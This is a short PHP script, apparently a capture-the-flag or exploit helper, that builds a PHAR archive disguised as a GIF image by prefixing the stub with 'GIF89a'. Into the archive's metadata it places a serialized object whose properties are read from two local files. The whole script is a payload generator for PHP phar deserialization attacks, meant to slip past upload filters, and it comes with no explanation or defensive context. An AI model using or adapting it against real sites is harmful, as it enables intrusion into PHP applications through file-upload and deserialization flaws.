<?php
    class WTF {
    }
    $a = new WTF();
    $a->var1 = file_get_contents('./1');
    $a->var2 = file_get_contents('./2');

    @unlink("step1.phar");
    $phar = new Phar("step1.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = $a;
    $phar->setMetadata($o);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
?>
